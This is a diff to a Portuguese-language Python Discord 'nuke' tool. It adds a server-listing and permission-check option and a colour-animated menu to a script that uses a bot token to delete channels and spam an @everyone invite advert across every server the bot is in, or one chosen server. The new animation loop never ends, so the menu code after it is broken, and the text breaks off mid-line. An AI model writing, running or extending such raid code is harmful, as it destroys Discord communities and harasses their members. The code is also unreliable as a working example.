@@ -4,9 +4,13 @@ from colorama import init, Fore as cc
 from os import name as os_name, system
 from sys import exit
 import time
+import itertools
 
+# Inicialização do Colorama
 init()
-dr = DR = r = R = cc.LIGHTRED_EX
+
+# Cores do Colorama
+dr = R = cc.LIGHTRED_EX
 g = G = cc.LIGHTGREEN_EX
 b = B = cc.LIGHTBLUE_EX
 m = M = cc.LIGHTMAGENTA_EX
@@ -14,13 +18,23 @@ c = C = cc.LIGHTCYAN_EX
 y = Y = cc.LIGHTYELLOW_EX
 w = W = cc.RESET
 
+# Função para limpar o terminal
 clear = lambda: system('cls') if os_name == 'nt' else system('clear')
 
+# Função personalizada para entrada
 def _input(text):
     print(text, end='')
     return input()
 
-baner = f'''
+# Função para animação RGB no título
+def rgb_animation(text, delay=0.1):
+    colors = [r, g, b, m, c, y]
+    for color in itertools.cycle(colors):
+        print(f'\r{color}{text}', end='')
+        time.sleep(delay)
+
+# Banner decorado
+banner = f'''
 {r}██████╗     ██╗  ██╗
 {r}██╔══██╗    ██║ ██╔╝
 {r}██║  ██║    █████╔╝ 
@@ -29,6 +43,21 @@ baner = f'''
 {r}╚═════╝     ╚═╝  ╚═╝
 {y}Feito por: {g}Menor dk
 '''
+
+# Função para exibir informações dos servidores
+async def display_guild_info(guild):
+    print(f'\n{r}Servidor: {m}{guild.name}')
+    print(f'{c}ID: {g}{guild.id}')
+    print(f'{b}Membros: {g}{len(guild.members)}')
+    print(f'{y}Canais: {g}{len(guild.channels)}')
+    print(f'{m}Roles: {g}{len(guild.roles)}')
+    perms = guild.me.guild_permissions
+    print(f'{w}Permissões:')
+    print(f'  {c}KICK_MEMBERS: {g}{perms.kick_members}')
+    print(f'  {c}BAN_MEMBERS: {g}{perms.ban_members}')
+    print(f'  {c}MANAGE_CHANNELS: {g}{perms.manage_channels}')
+    print(f'  {c}MANAGE_ROLES: {g}{perms.manage_roles}')
+    print(f'  {c}ADMINISTRATOR: {g}{perms.administrator}')
 
 async def delete_all_channel(guild):
     deleted = 0
@@ -97,21 +126,24 @@ async def nuke_guild(guild, name, message):
     
     print(f'{r}--------------------------------------------\n\n')
 
-def main():
-    clear()
-    choice = _input(f'''   
-{baner}                
+async def main():
+    while True:
+        clear()
+        rgb_animation(f'{banner}                
 {c}--------------------------------------------
 {b}[Menu]
     {y}└─[1] {m}- {g}Executar Setup Nuke Bot
     {y}└─[2] {m}- {g}Sair
     {y}└─[3] {m}- {g}Parar
-{y}====>{g}''')
-    
-    if choice == '1':
-        token = _input(f'{y}Insira o token do bot:{g}')
-        name = _input(f'{y}Insira o nome para os canais criados:{g}')
-        message = '''# DKZIN 🔥🥋🇾🇪
+    {y}└─[4] {m}- {g}Ver Servidores do Bot
+{y}====>{g}', delay=0.1)
+        
+        choice = _input('Escolha uma opção: ')
+        
+        if choice == '1':
+            token = _input(f'{y}Insira o token do bot:{g}')
+            name = _input(f'{y}Insira o nome para os canais criados:{g}')
+            message = '''# DKZIN 🔥🥋🇾🇪
 > - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
 - https://discord.com/invite/gZSx3n8Csa
 
@@ -119,52 +151,82 @@ def main():
 > BOTS DE KEY E MUITO MAIS
 
 @here @everyone'''
-        
-        clear()
-        choice_type = _input(f'''
-{baner}                
+            
+            clear()
+            choice_type = _input(f'''
+{banner}                
 {c}--------------------------------------------
 {b}[Selecione]
     {y}└─[1] {m}- {g}Nuke de todos os servidores.
     {y}└─[2] {m}- {g}Nuke apenas um servidor.
     {y}└─[3] {m}- {g}Sair
 {y}====>{g}''')
-        
-        client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
-        
-        if choice_type == '1':
-            @client.event
-            async def on_ready():
-                print(f'[+] Logado como {client.user.name}')
-                print(f'[+] Bot em {len(client.guilds)} servidores!')
-                for guild in client.guilds:
-                    await nuke_guild(guild, name, message)
-                await client.close()
-        
-        elif choice_type == '2':
-            guild_id = _input(f'{y}Insira o id do servidor:{g}')
-            @client.event
-            async def on_ready():
-                for guild in client.guilds:
-                    if str(guild.id) == guild_id:
+            
+            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
+            
+            if choice_type == '1':
+                @client.event
+                async def on_ready():
+                    print(f'[+] Logado como {client.user.name}')
+                    print(f'[+] Bot em {len(client.guilds)} servidores!')
+                    for guild in client.guilds:
                         await nuke_guild(guild, name, message)
-                await client.close()
+                    await client.close()
+            
+            elif choice_type == '2':
+                guild_id = _input(f'{y}Insira o id do servidor:{g}')
+                @client.event
+                async def on_ready():
+                    for guild in client.guilds:
+                        if str(guild.id) == guild_id:
+                            await nuke_guild(guild, name, message)
+                    await client.close()
+            
+            elif choice_type == '3':
+                print(f'{dr}Saindo...')
+                exit()
+            
+            try:
+                client.run(token)
+                _input('Nuke concluído, pressione Enter para voltar ao menu...')
+                clear()
+            except Exception as error:
+                if 'Privileged Intents' in str(error):
+                    _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
+                else:
+                    _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
         
-        elif choice_type == '3':
+        elif choice == '2':
             print(f'{dr}Saindo...')
             exit()
         
-        try:
-            client.run(token)
-            _input('Nuke concluído, pressione Enter para voltar ao menu...')
-        except Exception as error:
-            if 'Privileged Intents' in str(error):
-                _input(f'{r}Erro de Intents\n{g}Para corrigir -> https://prnt.sc/wmrwut\n{b}Pressione Enter para voltar...')
-            else:
+        elif choice == '3':
+            clear()
+            print(f'{dr}Bot Parado...')
+            input('Pressione Enter para voltar ao menu...')
+            clear()
+        
+        elif choice == '4':
+            token = _input(f'{y}Insira o token do bot:{g}')
+            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
+            
+            @client.event
+            async def on_ready():
+                clear()
+                print(f'{banner}                
+{c}--------------------------------------------
+{b}[Servidores do Bot]')
+                for guild in client.guilds:
+                    await display_guild_info(guild)
+                    print(f'{c}--------------------------------------------')
+                await client.close()
+            
+            try:
+                client.run(token)
+                _input('Pressione Enter para voltar ao menu...')
+                clear()
+            except Exception as error:
                 _input(f'{r}{error}\n{b}Pressione Enter para voltar...')
-    elif choice == '2':
-        print(f'{dr}Saindo...')
-        exit()
-
-if __name__ == "__main__":
-    main()
+        
+        else:
+            print(f'{r}Opção inválida. Press
